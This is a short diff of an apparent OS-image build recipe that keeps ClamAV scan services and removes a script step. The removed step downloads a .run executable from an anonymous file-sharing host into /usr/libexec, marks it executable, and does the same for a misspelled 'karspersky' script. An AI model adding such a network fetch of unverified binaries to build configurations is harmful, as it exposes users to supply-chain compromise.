@@ -55,11 +55,4 @@ modules:
       enabled:
         - clamav-scan.service
         - clamav-scan.timer
-  - type: script
-    snippets:
-      - curl
-        https://files.catbox.moe/rntqs0.run
-        > /usr/libexec/kvrt.run
-      - chmod +x /usr/libexec/kvrt.run
-      - chmod +x /etc/karspersky/karspersky.sh
   - type: signing
